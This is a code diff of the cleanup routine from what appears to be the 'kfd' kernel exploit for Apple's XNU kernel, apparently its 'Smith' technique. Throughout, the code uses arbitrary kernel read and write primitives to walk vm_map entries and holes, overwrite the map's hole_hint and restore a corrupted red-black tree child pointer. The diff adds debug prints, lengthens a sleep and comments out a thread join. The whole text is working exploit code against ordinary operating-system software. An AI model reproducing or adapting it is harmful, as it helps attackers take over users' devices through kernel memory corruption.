@@ -406,8 +406,9 @@ void smith_helper_cleanup(struct kfd* kfd)
          * Sleep an extra 100 us to make sure smith_helper_cleanup_pthread()
          * had the time to take the vm_map_lock().
          */
-        usleep(100);
+        usleep(500);
     }
+
     u64 map_kaddr = kfd->info.kernel.current_map;
 
     do {
@@ -420,6 +421,8 @@ void smith_helper_cleanup(struct kfd* kfd)
         u64 entry_count = 0;
         u64 entry_kaddr = dynamic_kget(vm_map, hdr_links_next, map_kaddr);
         u64 map_entry_kaddr = map_kaddr + dynamic_offsetof(vm_map, hdr_links_prev);
+        print_x64(entry_kaddr);
+        print_x64(map_entry_kaddr);
         u64 first_vme_kaddr = 0;
         u64 first_vme_parent_store = 0;
         u64 second_vme_kaddr = 0;
@@ -431,6 +434,7 @@ void smith_helper_cleanup(struct kfd* kfd)
         u64 leaked_entry_prev = 0;
         u64 leaked_entry_next = 0;
         u64 leaked_entry_end = 0;
+
         while (entry_kaddr != map_entry_kaddr) {
             entry_count++;
             u64 entry_next = static_kget(vm_map_entry, u64, links.next, entry_kaddr);
@@ -532,6 +536,7 @@ void smith_helper_cleanup(struct kfd* kfd)
         u64 first_leaked_hole_end = 0;
         u64 second_leaked_hole_prev = 0;
         u64 second_leaked_hole_next = 0;
+        printf("hole_kaddr 0x%llx\n", hole_kaddr);
 
         while (true) {
             hole_count++;
@@ -575,17 +580,25 @@ void smith_helper_cleanup(struct kfd* kfd)
          * We set map->hole_hint to point to the first hole, which is guaranteed
          * to not be one of the two holes that we just leaked.
          */
+        printf("first_hole_kaddr 0x%llx\n", first_hole_kaddr);
         dynamic_kset_u64(vm_map, hole_hint, map_kaddr, first_hole_kaddr);
+        printf("write hole_hint 0x%llx\n", first_hole_kaddr);
+        
     } while (0);
 
+    printf("take some lock?\n");
     if (take_vm_map_lock) {
         /*
          * Restore the entry to have its right child point to its original value.
          */
         u64 entry_kaddr = atomic_load(&smith->cleanup_vme.kaddr);
         u64 entry_right = atomic_load(&smith->cleanup_vme.right);
+        NSLog(@"entry_kaddr 0x%llx\n", entry_kaddr);
+        NSLog(@"entry_right 0x%llx\n", entry_right);
         static_kset_u64(vm_map_entry, store.entry.rbe_right, entry_kaddr, entry_right);
-        assert_bsd(pthread_join(smith->cleanup_vme.pthread, NULL));
+        NSLog(@"wait pid\n");
+        printf("wait pid\n");
+        // pthread_join(smith->cleanup_vme.pthread, NULL);
     }
 }
 
